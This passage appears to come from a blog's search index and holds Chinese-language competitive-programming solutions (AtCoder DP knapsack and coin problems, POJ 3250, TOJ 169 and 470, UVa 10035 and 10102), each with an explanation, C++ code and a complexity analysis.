class="line">			<span class="keyword">if</span>(dp[i]&lt;=w)&#123;</span><br><span class="line">				ans=i;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>有 $NV$ 種狀態，每種狀態轉移複雜度為 $O(1)$<br>輸出複雜度也為 $O(NV)$<br>總複雜度 $O(NV)$</p>
]]></content>
      <categories>
        <category>AtCoder</category>
      </categories>
      <tags>
        <tag>AtCoder</tag>
        <tag>DP</tag>
        <tag>Backpack</tag>
      </tags>
  </entry>
  <entry>
    <title>Atcoder DP Contest pD</title>
    <url>/2020/06/26/Atcoder%20DP%20Contest%20pD/</url>
    <content><![CDATA[<h1 id="Atcoder-DP-Contest-pD"><a href="#Atcoder-DP-Contest-pD" class="headerlink" title="Atcoder DP Contest pD"></a>Atcoder DP Contest pD</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://atcoder.jp/contests/dp/tasks/dp_d" target="_blank" rel="noopener">https://atcoder.jp/contests/dp/tasks/dp_d</a><br>有一個負重上限為 $w$ 的背包<br>有 $n$ 個物品，每個物品都有其重量及價值<br>求能放入背包內的最大價值為何</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>對於每個物品查看用該物品能組出的重量分別能形成的價值為多少並不斷更新<br>定義 $DP[i][j]$ 表示在前 $i$ 物中最大負重為 $j$ 時的最大價值<br>則可得轉移式 $DP[i][j] = max(DP[i-1][j], DP[i-1][j-cost[i]]+value[i])$<br>且為了避免取同物品多次的狀況，最大負重從 $w$ 開始往下算<br>不過在實作上可以發現到每次取的都是 $i-1$ 的狀態，所以實際上可以壓縮成一維</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MaxN = <span class="number">105</span>,MaxW = <span class="number">100005</span>;</span><br><span class="line"><span class="keyword">int</span> n,w,cost[MaxN],value[MaxN];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> dp[MaxW];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;w)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;cost[i]&gt;&gt;value[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=w ; j-cost[i]&gt;=<span class="number">0</span> ; j--)&#123;</span><br><span class="line">				dp[j] = max(dp[j], dp[j-cost[i]]+value[i]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;dp[w]&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>有 $w$ 種狀態，每種狀態轉移複雜度為 $O(n)$<br>總複雜度 $O(wn)$</p>
]]></content>
      <categories>
        <category>AtCoder</category>
      </categories>
      <tags>
        <tag>AtCoder</tag>
        <tag>DP</tag>
        <tag>Backpack</tag>
      </tags>
  </entry>
  <entry>
    <title>POJ 3250</title>
    <url>/2020/09/11/POJ%203250/</url>
    <content><![CDATA[<h1 id="POJ-3250"><a href="#POJ-3250" class="headerlink" title="POJ 3250"></a>POJ 3250</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://vjudge.net/problem/POJ-3250" target="_blank" rel="noopener">https://vjudge.net/problem/POJ-3250</a><br>可見杆問題<br>給一群杆子的高度，求在每根杆子上向右看能看到的杆子數量總和<br>定義能看到是<strong>你所在的桿杆和該桿杆之間的所有桿杆高度都小於你所在的桿杆的高度</strong></p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>觀察能看到其他杆子的集合所形成的序列可以發現是呈現 <strong>遞減</strong> 的狀態<br>因此我們只要能維護一個嚴格遞減的序列，剩下的就必定會是能看到其他人的杆子<br>因為這裡的狀態是先進後出，跟stack一樣，所以選擇stack<br>每次將stack內所剩餘的元素數量加總即可求解</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,ans=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; st;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">		ans=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span>(!st.empty()) st.pop();</span><br><span class="line">		<span class="keyword">while</span>(n--)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;m;</span><br><span class="line">			<span class="keyword">while</span>(!st.empty() &amp;&amp; m&gt;=st.top())</span><br><span class="line">				st.pop();</span><br><span class="line">			ans+=st.size();</span><br><span class="line">			st.push(m);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>掃過一次字串即可，複雜度 $O(len(m))$<br>總複雜度 $O(nlen(m))$</p>
]]></content>
      <categories>
        <category>POJ</category>
      </categories>
      <tags>
        <tag>POJ</tag>
        <tag>資料結構</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 169</title>
    <url>/2020/09/12/TOJ169/</url>
    <content><![CDATA[<h2 id="TOJ-169"><a href="#TOJ-169" class="headerlink" title="TOJ 169"></a>TOJ 169</h2><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://toj.tfcis.org/oj/pro/169/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/169/</a><br>可見杆問題<br>給一群杆子的高度，求在每根杆子上向左看能看到的杆子數量總和<br>定義能看到是<strong>你所在的桿杆和該桿杆之間的所有桿杆高度都小於你所在的桿杆的高度</strong></p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>觀察能被其他杆子看到的集合所形成的序列可以發現是呈現 <strong>遞增</strong> 的狀態<br>因此我們只要能維護一個嚴格遞增的序列，剩下的就必定會是能被看到的杆子<br>因為這裡的狀態是先進後出，跟stack一樣，所以選擇stack<br>stack的頂與當前元素之間的元素數量即為當前杆子能看到的數量</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> Max_N = <span class="number">1e7</span>+<span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> t,n,m,arr[Max_N];</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; st;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">	<span class="built_in">cin</span>.tie(<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">cout</span>.tie(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;t)&#123;</span><br><span class="line">		st.clear();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=t ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">			<span class="keyword">while</span>(!st.empty() &amp;&amp; arr[i]&gt;arr[st.back()])</span><br><span class="line">				st.pop_back();</span><br><span class="line">			<span class="keyword">if</span>(i<span class="number">-1</span>) <span class="built_in">cout</span>&lt;&lt;<span class="string">' '</span>;</span><br><span class="line">			<span class="keyword">if</span>(st.empty()) <span class="built_in">cout</span>&lt;&lt;i<span class="number">-1</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;(i-st.back()<span class="number">-1</span>);</span><br><span class="line">			st.push_back(i);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>掃過一次字串即可，複雜度 $O(t)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>資料結構</tag>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa10035</title>
    <url>/2020/07/02/UVa10035/</url>
    <content><![CDATA[<h1 id="UVa10035"><a href="#UVa10035" class="headerlink" title="UVa10035"></a>UVa10035</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10035" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10035</a><br>給兩個十位數，求相加過程中進位幾次</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>直接模擬一遍加法的作法<br>從最低位開始相加，如果有進位記錄進位多少，再將答案遞增即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">string</span> a,b;</span><br><span class="line"><span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> A=a.size()<span class="number">-1</span>,B=b.size()<span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">int</span> carry=<span class="number">0</span>,num_A,num_B;</span><br><span class="line">	<span class="keyword">while</span>(A&gt;=<span class="number">0</span> || B&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">		num_A=(A&lt;<span class="number">0</span>) ? <span class="number">0</span> : a[A]-<span class="string">'0'</span>;</span><br><span class="line">		num_B=(B&lt;<span class="number">0</span>) ? <span class="number">0</span> : b[B]-<span class="string">'0'</span>;</span><br><span class="line">		<span class="keyword">if</span>(num_A+num_B+carry&gt;<span class="number">9</span>)&#123;</span><br><span class="line">			carry=(num_A+num_B+carry)/<span class="number">10</span>;</span><br><span class="line">			cnt++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			carry=<span class="number">0</span>;</span><br><span class="line">		A--,B--;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b &amp;&amp; (a!=<span class="string">"0"</span> || b!=<span class="string">"0"</span>))&#123;</span><br><span class="line">		cnt=<span class="number">0</span>;</span><br><span class="line">		solve();</span><br><span class="line">		<span class="keyword">if</span>(cnt&gt;<span class="number">1</span>)</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;cnt&lt;&lt;<span class="string">" carry operations.\n"</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(cnt==<span class="number">1</span>)</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"1 carry operation.\n"</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"No carry operation.\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>對每個位數做處理，每個位數處理時間複雜度為 $O(1)$<br>總時間複雜度為 $O(max(len(A),len(B)))$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
        <tag>string</tag>
      </tags>
  </entry>
  <entry>
    <title>Atcoder DP Contest pI</title>
    <url>/2020/06/27/Atcoder%20DP%20Contest%20pI/</url>
    <content><![CDATA[<h1 id="Atcoder-DP-Contest-pI"><a href="#Atcoder-DP-Contest-pI" class="headerlink" title="Atcoder DP Contest pI"></a>Atcoder DP Contest pI</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://atcoder.jp/contests/dp/tasks/dp_i" target="_blank" rel="noopener">https://atcoder.jp/contests/dp/tasks/dp_i</a><br>有 $n$ 個硬幣，每個硬幣有翻到正面的機率 $p_i$<br>問正面多於反面的機率有多少</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>嘗試遮住最後一個硬幣，觀察每次擲硬幣會影響到哪些<br>定義 $DP[i]$ 表示有 $i$ 個硬幣為正面的機率<br>則有轉移式 $DP[i] = DP[i-1]*arr[i] + DP[i]*(1-arr[i])$<br>且已知 $DP[0] = 1$</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">double</span> now,dp[<span class="number">3005</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">		dp[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;now;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span> ; j&gt;=<span class="number">0</span> ; j--)&#123;</span><br><span class="line">				dp[j] = (j==<span class="number">0</span> ? <span class="number">0</span> : dp[j<span class="number">-1</span>]*now) + dp[j]*(<span class="number">1</span>-now);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">double</span> ans=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=n/<span class="number">2</span>+<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">			ans+=dp[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;fixed&lt;&lt;setprecision(<span class="number">10</span>)&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>有 $n$ 種狀態，每種狀態轉移複雜度約為 $O(n)$<br>總複雜度 $O(n^2)$</p>
<h6 id="tags-Atcoder-DP-Contest"><a href="#tags-Atcoder-DP-Contest" class="headerlink" title="tags: Atcoder DP Contest"></a>tags: <code>Atcoder DP Contest</code></h6>]]></content>
      <categories>
        <category>AtCoder</category>
      </categories>
      <tags>
        <tag>AtCoder</tag>
        <tag>DP</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ470</title>
    <url>/2020/07/03/TOJ470/</url>
    <content><![CDATA[<h1 id="TOJ470"><a href="#TOJ470" class="headerlink" title="TOJ470"></a>TOJ470</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://toj.tfcis.org/oj/pro/470/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/470/</a><br>給每天訓練的成效值，在不能練續兩天訓練的前提下，問最多能獲得多少成效值</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>每天都有取或不取兩種選擇<br>定義DP式 $DP[i][j]$ 表示第 $i$ 天選或不選($j=0$或$j=1$)的最大成效值<br>可得轉移式<br>$DP[i][1] = max(DP[i-1][0]+arr[i], DP[i][1])$<br>$DP[i][0] = max(DP[i-1][1], DP[i-1][0])$<br>不過實作後會發現到每次會影響到的只有上一個狀態，所以只需要記錄前一個狀態即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> tmp,ans=<span class="number">0</span>,dp[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">		ans=<span class="number">0</span>;</span><br><span class="line">		<span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;tmp;</span><br><span class="line">			dp[i%<span class="number">2</span>][<span class="number">0</span>]=max(dp[(i<span class="number">-1</span>)%<span class="number">2</span>][<span class="number">1</span>],dp[(i<span class="number">-1</span>)%<span class="number">2</span>][<span class="number">0</span>]);</span><br><span class="line">			dp[i%<span class="number">2</span>][<span class="number">1</span>]=max(dp[(i<span class="number">-1</span>)%<span class="number">2</span>][<span class="number">0</span>]+tmp,dp[i%<span class="number">2</span>][<span class="number">1</span>]);</span><br><span class="line">			ans=max(dp[i%<span class="number">2</span>][<span class="number">0</span>],dp[i%<span class="number">2</span>][<span class="number">1</span>]);</span><br><span class="line">			dp[(i<span class="number">-1</span>)%<span class="number">2</span>][<span class="number">0</span>] = dp[(i<span class="number">-1</span>)%<span class="number">2</span>][<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>有 $2n$ 種狀態，每種狀態轉移時間複雜度為 $O(1)$<br>總時間複雜度為 $O(2n)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>DP</tag>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa10102</title>
    <url>/2020/06/17/UVa10102/</url>
    <content><![CDATA[<h1 id="UVa10102"><a href="#UVa10102" class="headerlink" title="UVa10102"></a>UVa10102</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>針對每個起點(1)做BFS，找到最近的3得到距離，再從其中找最大值</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,ans,dir[<span class="number">4</span>][<span class="number">2</span>]=&#123;&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">-1</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">char</span> arr[<span class="number">105</span>][<span class="number">105</span>];</span><br><span class="line"><span class="keyword">bool</span> inq[<span class="number">105</span>][<span class="number">105</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dis</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> fx,<span class="keyword">int</span> fy)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">abs</span>(x-fx)+<span class="built_in">abs</span>(y-fy);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ok</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (x&gt;=<span class="number">0</span>) &amp;&amp; (x&lt;n) &amp;&amp; (y&gt;=<span class="number">0</span>) &amp;&amp; (y&lt;n);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">		ans=<span class="number">0</span>;</span><br><span class="line">		<span class="built_in">queue</span>&lt;pii&gt; q;</span><br><span class="line">		<span class="built_in">vector</span>&lt;pii&gt; px;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;n ; j++)&#123;</span><br><span class="line">				<span class="built_in">cin</span>&gt;&gt;arr[i][j];</span><br><span class="line">				<span class="keyword">if</span>(arr[i][j] == <span class="string">'1'</span>)&#123;</span><br><span class="line">					px.emplace_back(i,j);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//BFS every vector</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> i: px)&#123;</span><br><span class="line">			<span class="keyword">int</span> fx,fy;tie(fx,fy)=i;</span><br><span class="line">			q.emplace(fx,fy);</span><br><span class="line">			inq[fx][fy]=<span class="literal">true</span>;</span><br><span class="line">			<span class="keyword">while</span>(!q.empty())&#123;</span><br><span class="line">				<span class="keyword">int</span> x,y;tie(x,y)=q.front();</span><br><span class="line">				q.pop();</span><br><span class="line">				<span class="comment">//end</span></span><br><span class="line">				<span class="keyword">if</span>(arr[x][y]==<span class="string">'3'</span>)&#123;</span><br><span class="line">					ans=max(ans, dis(x,y,fx,fy));</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">4</span> ; i++)&#123;</span><br><span class="line">					<span class="keyword">int</span> nx=x+dir[i][<span class="number">0</span>];</span><br><span class="line">					<span class="keyword">int</span> ny=y+dir[i][<span class="number">1</span>];</span><br><span class="line">					<span class="keyword">if</span>(ok(nx,ny) &amp;&amp; !inq[nx][ny])&#123;</span><br><span class="line">						inq[nx][ny]=<span class="literal">true</span>;</span><br><span class="line">						q.emplace(nx,ny);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">while</span>(!q.empty())&#123;</span><br><span class="line">				q.pop();</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">105</span> ; i++)&#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">105</span> ; j++)&#123;</span><br><span class="line">					inq[i][j]=<span class="literal">false</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><ul>
<li>輸入<br>  $O(N^2)$</li>
<li>BFS<br>最糟會將地圖都跑過一遍，為$O(N^2)$<br>而起點最多N個<br>  $O(N^3)$</li>
</ul>
<p>整體複雜度: $O(N^3)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
        <tag>BFS</tag>
      </tags>
  </entry>
